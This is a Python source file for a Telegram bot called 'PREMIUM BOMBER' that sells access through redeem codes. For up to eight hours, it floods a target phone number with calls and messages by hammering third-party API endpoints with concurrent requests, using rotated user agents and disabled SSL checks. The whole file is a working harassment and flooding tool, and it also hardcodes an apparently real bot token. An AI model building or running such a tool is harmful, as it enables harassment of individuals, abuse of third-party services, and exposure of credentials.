import asyncio
import aiohttp
import time
import sqlite3
import random
import string
import os
import json
import logging
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from aiohttp import web

# =========================================
# ⚙️ CONFIGURATION
# =========================================
BOT_TOKEN = "8016499618:AAFuMAsws27GBEnOGpufm1vI4UeBfE7yAf4" 
OWNER_ID = 5297630438

WELCOME_IMAGE = "https://i.postimg.cc/nczX6L6f/file-000000008f987230882c6568d09ed6e3-640x360.png"

# Render ke liye PORT (Important)
PORT = int(os.environ.get("PORT", 8080))

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# =========================================
# 📂 LOAD APIS FROM JSON FILE
# =========================================
def load_apis():
    try:
        with open('api.json', 'r') as f:
            apis = json.load(f)
            logger.info(f"Loaded {len(apis)} APIs from api.json")
            return apis
    except Exception as e:
        logger.error(f"Error loading api.json: {e}")
        return []

APIS = load_apis()

# DURATION OPTIONS
DURATION_OPTIONS = {
    "1": 1, "5": 5, "15": 15, "30": 30,
    "60": 60, "120": 120, "240": 240, "480": 480
}

# =========================================
# 🗄️ DATABASE SYSTEM
# =========================================
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('fusion_premium.db', check_same_thread=False)
        self.create_tables()
        self.temp_attack_data = {}
        self.temp_admin_data = {}

    def create_tables(self):
        c = self.conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                    (user_id INTEGER PRIMARY KEY, 
                     premium_expiry TEXT, 
                     protected_number TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes 
                    (code TEXT PRIMARY KEY, 
                     days INTEGER, 
                     is_used INTEGER DEFAULT 0)''')
        self.conn.commit()

    def get_user(self, user_id):
        c = self.conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
        return c.fetchone()

    def add_user(self, user_id):
        if not self.get_user(user_id):
            c = self.conn.cursor()
            c.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
            self.conn.commit()

    def is_premium(self, user_id):
        if user_id == OWNER_ID: 
            return True
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                expiry = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                return datetime.now() < expiry
            except:
                return False
        return False

    def add_premium(self, user_id, days):
        current = datetime.now()
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                stored = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                if stored > current:
                    current = stored
            except:
                pass
        
        new_exp = current + timedelta(days=days)
        str_exp = new_exp.strftime("%Y-%m-%d %H:%M:%S")
        
        c = self.conn.cursor()
        if not user:
            c.execute("INSERT INTO users (user_id, premium_expiry) VALUES (?, ?)", (user_id, str_exp))
        else:
            c.execute("UPDATE users SET premium_expiry=? WHERE user_id=?", (str_exp, user_id))
        self.conn.commit()
        return str_exp

    def generate_code(self, days):
        code = "PREMIUM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        c = self.conn.cursor()
        try:
            c.execute("INSERT INTO redeem_codes (code, days) VALUES (?, ?)", (code, days))
            self.conn.commit()
            return code
        except:
            return self.generate_code(days)

    def redeem(self, user_id, code):
        c = self.conn.cursor()
        c.execute("SELECT days, is_used FROM redeem_codes WHERE code=?", (code,))
        res = c.fetchone()
        if not res:
            return False, 0, None
        
        days, is_used = res
        if is_used == 1:
            return False, 0, None
        
        try:
            c.execute("UPDATE redeem_codes SET is_used=1 WHERE code=?", (code,))
            exp_date = self.add_premium(user_id, days)
            self.conn.commit()
            return True, days, exp_date
        except:
            self.conn.rollback()
            return False, 0, None

    def protect(self, user_id, number):
        c = self.conn.cursor()
        c.execute("UPDATE users SET protected_number=? WHERE user_id=?", (number, user_id))
        self.conn.commit()

    def unprotect(self, user_id):
        c = self.conn.cursor()
        c.execute("UPDATE users SET protected_number=NULL WHERE user_id=?", (user_id,))
        self.conn.commit()

    def is_protected(self, number):
        c = self.conn.cursor()
        c.execute("SELECT user_id FROM users WHERE protected_number=?", (number,))
        return c.fetchone() is not None

    def get_all_users(self):
        c = self.conn.cursor()
        c.execute("SELECT user_id FROM users")
        return [row[0] for row in c.fetchall()]

    def get_stats(self):
        c = self.conn.cursor()
        u = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        total_codes = c.execute("SELECT COUNT(*) FROM redeem_codes").fetchone()[0]
        return u, total_codes

    def set_attack_data(self, user_id, phone):
        self.temp_attack_data[user_id] = {'phone': phone, 'timestamp': time.time()}

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:
            return data['phone']
        else:
            if user_id in self.temp_attack_data:
                del self.temp_attack_data[user_id]
            return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]

# =========================================
# 💣 ATTACK MANAGER
# =========================================
class AttackManager:
    def __init__(self):
        self.active_attacks = {} 
        self.db = Database()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36",
        ]

    async def _make_request(self, session, api, phone):
        try:
            url = api['url'].replace('{no}', phone)
            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = random.choice(self.user_agents)
            timeout = aiohttp.ClientTimeout(total=5)

            if api['method'].upper() == 'GET':
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                    await resp.read()
                    return True
            else:
                body = {}
                if api.get('body'):
                    for k, v in api['body'].items():
                        if isinstance(v, str):
                            body[k] = v.replace('{no}', phone)
                        else:
                            body[k] = v

                content_type = headers.get('Content-Type', '')
                if 'application/json' in content_type:
                    async with session.post(url, headers=headers, json=body, timeout=timeout, ssl=False) as resp:
                        await resp.read()
                else:
                    async with session.post(url, headers=headers, data=body, timeout=timeout, ssl=False) as resp:
                        await resp.read()
                return True
        except:
            return False

    async def _run_attack_engine(self, user_id, phone, duration):
        end_time = time.time() + (duration * 60)
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time:
                if user_id not in self.active_attacks or not self.active_attacks[user_id]["running"]:
                    break
                tasks = [asyncio.create_task(self._make_request(session, api, phone)) for api in APIS]
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.5)

    async def start_attack(self, user_id, phone, duration):
        if user_id in self.active_attacks:
            return False
        if not self.db.is_premium(user_id):
            return False

        self.active_attacks[user_id] = {
            "phone": phone,
            "end_time": time.time() + (duration * 60),
            "running": True
        }
        asyncio.create_task(self._run_attack_engine(user_id, phone, duration))
        return True

    async def stop_attack(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            del self.active_attacks[user_id]
            return True
        return False

manager = AttackManager()

# =========================================
# 🖥️ UI & KEYBOARDS
# =========================================
def main_kb(user_id):
    kb = [
        [KeyboardButton("🚀 Call"), KeyboardButton("📊 Status")],
        [KeyboardButton("👤 Account"), KeyboardButton("❓ Help")],
        [KeyboardButton("🛡 Protect"), KeyboardButton("🔓 Unprotect")],
        [KeyboardButton("💳 Plans"), KeyboardButton("🔑 Redeem")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("👑 Admin Panel")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"), 
         InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 Stats", callback_data="adm_stats")]
    ])

def duration_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("1 Min", callback_data="dur_1"),
         InlineKeyboardButton("5 Min", callback_data="dur_5"),
         InlineKeyboardButton("15 Min", callback_data="dur_15")],
        [InlineKeyboardButton("30 Min", callback_data="dur_30"),
         InlineKeyboardButton("1 Hour", callback_data="dur_60"),
         InlineKeyboardButton("2 Hours", callback_data="dur_120")],
        [InlineKeyboardButton("4 Hours", callback_data="dur_240"),
         InlineKeyboardButton("8 Hours", callback_data="dur_480"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")]
    ])

# =========================================
# HANDLERS
# =========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    manager.db.add_user(user_id)
    
    if not manager.db.is_premium(user_id):
        msg = "👋 **Welcome to PREMIUM BOMBER!**\n\n⛔ **You are NOT a premium user!**"
    else:
        msg = "👋 **Welcome to PREMIUM BOMBER!**\n\n✅ **You are PREMIUM user!**"
    
    await update.message.reply_photo(WELCOME_IMAGE, caption=msg, reply_markup=main_kb(user_id), parse_mode="Markdown")

async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    manager.db.add_user(user_id)

    if text == "🚀 Call":
        if not manager.db.is_premium(user_id):
            await update.message.reply_text("⛔ Premium required to use Call feature.", reply_markup=main_kb(user_id))
            return
        if user_id in manager.active_attacks:
            await update.message.reply_text("⚠️ You already have an active attack!", reply_markup=main_kb(user_id))
            return
        await update.message.reply_text("📞 Enter 10-digit Phone Number:\nExample: `9876543210`", parse_mode="Markdown")
        context.user_data['waiting_for_number'] = True

    elif text == "📊 Status":
        if user_id in manager.active_attacks:
            info = manager.active_attacks[user_id]
            left = int((info['end_time'] - time.time()) / 60)
            await update.message.reply_text(f"🔥 **ATTACK RUNNING**\n🎯 `{info['phone']}`\n⏳ Left: {left} Minutes", parse_mode="Markdown")
        else:
            await update.message.reply_text("💤 No active attacks.", reply_markup=main_kb(user_id))

    elif text == "💳 Plans":
        await update.message.reply_text("💎 Contact Admin for Premium Plans.", reply_markup=main_kb(user_id))

    elif text == "👑 Admin Panel" and user_id == OWNER_ID:
        await update.message.reply_text("👑 Admin Panel", reply_markup=admin_kb())

    elif text == "🔑 Redeem":
        await update.message.reply_text("🔑 Send Premium Code:", reply_markup=main_kb(user_id))
        context.user_data['waiting_for_redeem'] = True

    elif text == "🛡 Protect":
        if not manager.db.is_premium(user_id):
            await update.message.reply_text("⛔ Premium only!", reply_markup=main_kb(user_id))
            return
        await update.message.reply_text("🛡 Enter number to protect:", reply_markup=main_kb(user_id))
        context.user_data['waiting_for_protect'] = True

    elif text == "🔓 Unprotect":
        if not manager.db.is_premium(user_id):
            await update.message.reply_text("⛔ Premium only!", reply_markup=main_kb(user_id))
            return
        manager.db.unprotect(user_id)
        await update.message.reply_text("🔓 Number unprotected.", reply_markup=main_kb(user_id))

    elif text == "👤 Account":
        is_prem = manager.db.is_premium(user_id)
        status = "💎 Premium" if is_prem else "⛔ Free"
        await update.message.reply_text(f"👤 Account\n🆔 `{user_id}`\nStatus: {status}", parse_mode="Markdown", reply_markup=main_kb(user_id))

    elif text == "❓ Help":
        await update.message.reply_text("Use menu buttons.", reply_markup=main_kb(user_id))

    # Number Input for Attack
    elif context.user_data.get('waiting_for_number') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_number'] = False
        if manager.db.is_protected(text):
            await update.message.reply_text("🛡 This number is protected!", reply_markup=main_kb(user_id))
            return
        manager.db.set_attack_data(user_id, text)
        await update.message.reply_text(f"📞 Target: `{text}`\n\nSelect Duration:", reply_markup=duration_kb(), parse_mode="Markdown")

    # Redeem Code
    elif context.user_data.get('waiting_for_redeem'):
        context.user_data['waiting_for_redeem'] = False
        code = text.strip().upper()
        success, days, exp = manager.db.redeem(user_id, code)
        if success:
            await update.message.reply_text(f"✅ Premium Activated!\nDays: {days}\nExpiry: {exp}", parse_mode="Markdown", reply_markup=main_kb(user_id))
        else:
            await update.message.reply_text("❌ Invalid or used code.", reply_markup=main_kb(user_id))

    # Protect Number
    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_protect'] = False
        manager.db.protect(user_id, text)
        await update.message.reply_text(f"🛡 Protected: `{text}`", parse_mode="Markdown", reply_markup=main_kb(user_id))

    elif text.lower() == '/cancel':
        context.user_data.clear()
        manager.db.clear_attack_data(user_id)
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(user_id))

# Callback Handler
async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data

    if data.startswith("dur_"):
        phone = manager.db.get_attack_data(uid)
        if not phone:
            await query.edit_message_text("Session expired. Start again.")
            return
        dur_key = data.split("_")[1]
        duration = DURATION_OPTIONS.get(dur_key, 5)

        success = await manager.start_attack(uid, phone, duration)
        if success:
            await query.edit_message_text(f"🚀 Attack Started on `{phone}` for {duration} minutes!", parse_mode="Markdown")
        else:
            await query.edit_message_text("❌ Failed to start attack.")

        manager.db.clear_attack_data(uid)

    elif data == "cancel_attack":
        manager.db.clear_attack_data(uid)
        await query.edit_message_text("❌ Cancelled.")

    elif data == "stop":
        if await manager.stop_attack(uid):
            await query.edit_message_text("🛑 Attack Stopped!")
        else:
            await query.answer("No active attack.")

    elif data == "adm_genkey" and uid == OWNER_ID:
        context.user_data['waiting_for_genkey'] = True
        await query.message.reply_text("Enter days for premium code:")

    elif data == "adm_broadcast" and uid == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await query.message.reply_text("Enter message to broadcast:")

    elif data == "adm_stats" and uid == OWNER_ID:
        u, c = manager.db.get_stats()
        await query.answer(f"Users: {u}\nCodes: {c}", show_alert=True)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data.clear()
    manager.db.clear_attack_data(user_id)
    await update.message.reply_text("❌ Operation Cancelled.", reply_markup=main_kb(user_id))

# =========================================
# WEB SERVER
# =========================================
async def start_web_server():
    async def handle(request):
        return web.Response(text="Bot is Alive! 🚀")
    
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"🌐 Web Server running on port {PORT}")

# =========================================
# MAIN FUNCTION
# =========================================
async def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    application.add_handler(CallbackQueryHandler(btn_handler))

    logger.info("Starting Bot + Web Server...")

    asyncio.create_task(start_web_server())

    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)

    logger.info(f"✅ Bot Started Successfully on Render!")

    try:
        await asyncio.Future()  # Keep running
    finally:
        await application.stop()

# =========================================
# START
# =========================================
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 PREMIUM BOMBER Starting...")
    print(f"📊 APIs Loaded: {len(APIS)}")
    print(f"🌐 PORT: {PORT}")
    print("=" * 60)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot Stopped.")
    except Exception as e:
        logger.error(f"Error: {e}", exc_info=True)
